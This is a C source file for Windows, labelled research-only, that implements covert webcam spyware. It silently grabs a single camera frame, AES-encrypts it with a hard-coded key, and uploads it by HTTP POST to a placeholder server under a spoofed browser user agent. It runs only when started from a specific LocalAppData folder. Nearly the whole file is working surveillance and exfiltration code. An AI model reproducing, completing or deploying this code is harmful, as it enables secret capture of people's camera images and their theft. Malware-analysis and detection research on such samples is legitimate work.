/**
 * Use of this program for purposes other than research is prohibited.
 * 本プログラムの研究目的以外での使用を禁ずる。
 */
#include <windows.h>
#include <vfw.h>
#include <stdio.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <winhttp.h>

#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "winhttp.lib")

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

BYTE key[16] = { 0x9d, 0xe7, 0x5c, 0x29, 0xb5, 0x7, 0x38, 0x71, 0xd, 0x83, 0x49, 0x39, 0x73, 0xfd, 0xeb, 0x9c };

int Encrypt(
    const BYTE* plaintext,
    DWORD plaintextLen,
    const BYTE key[16],
    BYTE** ciphertext,
    DWORD* ciphertextLen
) {

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbData = 0;
    DWORD cbKeyObject = 0;
    DWORD blockLen = 0;
    BYTE* pbKeyObject = NULL;
    BYTE* pbIV = NULL;
    BYTE* pbCiphertext = NULL;
    DWORD cbCiphertext = 0;
    int result = 0;

    BYTE iv[16];
    status = BCryptGenRandom(NULL, iv, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (!NT_SUCCESS(status)) {
        goto CLEANUP;
    }

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) {
        goto CLEANUP;
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, (ULONG)(wcslen(BCRYPT_CHAIN_MODE_CBC) + 1) * sizeof(WCHAR), 0);
    if (!NT_SUCCESS(status)) {
        goto CLEANUP;
    }

    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!NT_SUCCESS(status)) {
        goto CLEANUP;
    }

    status = BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (PUCHAR)&blockLen, sizeof(DWORD), &cbData, 0);
    if (!NT_SUCCESS(status)) {
        goto CLEANUP;
    }
    if (blockLen != 16) {
        goto CLEANUP;
    }

    pbKeyObject = (BYTE*)malloc(cbKeyObject);
    if (!pbKeyObject) {
        goto CLEANUP;
    }

    pbIV = (BYTE*)malloc(blockLen);
    if (!pbIV) {
        goto CLEANUP;
    }
    memcpy(pbIV, iv, blockLen);

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PUCHAR)key, 16, 0);
    if (!NT_SUCCESS(status)) {
        goto CLEANUP;
    }

    status = BCryptEncrypt(hKey, (PUCHAR)plaintext, plaintextLen, NULL, pbIV, blockLen, NULL, 0, &cbCiphertext, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) {
        goto CLEANUP;
    }

    pbCiphertext = (BYTE*)malloc(cbCiphertext + 16); // iv + ciphertext
    if (!pbCiphertext) {
        goto CLEANUP;
    }

    memcpy(pbIV, iv, blockLen);

    status = BCryptEncrypt(hKey, (PUCHAR)plaintext, plaintextLen, NULL, pbIV, blockLen, pbCiphertext + 16, cbCiphertext, &cbCiphertext, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) {
        goto CLEANUP;
    }

    memcpy(pbCiphertext, iv, blockLen);

    *ciphertext = pbCiphertext;
    *ciphertextLen = cbCiphertext + 16;
    pbCiphertext = NULL;
    result = 1;

CLEANUP:
    if (pbCiphertext) free(pbCiphertext);
    if (pbIV) free(pbIV);
    if (pbKeyObject) free(pbKeyObject);
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

static bool g_gotFrame = false;

BYTE* encData = NULL;
DWORD encDataLen = 0;

bool Save(const BYTE* pData, DWORD dataSize)
{
    Encrypt(pData, dataSize, key, &encData, &encDataLen);
    return true;
}

LRESULT CALLBACK FrameCallback(HWND hWnd, LPVIDEOHDR lpVHdr)
{
    if (g_gotFrame) {
        return (LRESULT)TRUE;
    }

    BYTE* pData = (BYTE*)lpVHdr->lpData;
    DWORD dataSize = lpVHdr->dwBytesUsed;

    if (Save(pData, dataSize)) {
        g_gotFrame = true;
    }

    return (LRESULT)TRUE;
}

int WebcamScreenshot() {
    HWND hCap = capCreateCaptureWindow(L"capture", 0, 0, 0, 640, 480, 0, 0);
    if (!hCap) {
        return 1;
    }

    if (!capDriverConnect(hCap, 0)) {
        return 1;
    }

    Sleep(1000);
    SendMessage(hCap, WM_CAP_SET_CALLBACK_FRAME, 0, (LPARAM)FrameCallback);

    g_gotFrame = false;
    if (!SendMessage(hCap, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0)) {
        capDriverDisconnect(hCap);
        return 1;
    }

    Sleep(500);
    capDriverDisconnect(hCap);
    return 0;
}

#define SERVER_NAME L"meccha-ayashii-server.internal"
#define SERVER_PORT 80
#define UPLOAD_PATH L"/waiwai"

int SendData(const BYTE* data, DWORD size) {
    int result = 0;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    
    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession) {
        goto cleanup;
    }

    hConnect = WinHttpConnect(hSession, SERVER_NAME, SERVER_PORT, 0);
    if (!hConnect) {
        goto cleanup;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"POST", UPLOAD_PATH, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        goto cleanup;
    }

    if (!WinHttpSendRequest(
        hRequest,
        L"Content-Type: application/octet-stream\r\n",
        (DWORD)-1,
        WINHTTP_NO_REQUEST_DATA,
        0,
        size,
        0)) {
        goto cleanup;
    }

    {
        DWORD bytesWritten = 0;
        if (!WinHttpWriteData(hRequest, data, size, &bytesWritten)) {
            goto cleanup;
        }
        if (bytesWritten != size) {
            goto cleanup;
        }
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        goto cleanup;
    }

    result = 1;

cleanup:
    if (hRequest)  WinHttpCloseHandle(hRequest);
    if (hConnect)  WinHttpCloseHandle(hConnect);
    if (hSession)  WinHttpCloseHandle(hSession);
    return result;
}

int wmain()
{
    wchar_t cdir[512];
    GetCurrentDirectoryW(512, cdir);
    wchar_t* localappdataPath = NULL;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localappdataPath);
    wchar_t execPath[512];
    swprintf_s(execPath, 512, L"%s\\ayashii-folder", localappdataPath);
    if (wcsncmp(cdir, execPath, 512) != 0) {
        return 0;
    }

    WebcamScreenshot();
    SendData(encData, encDataLen);
    return 0;
}
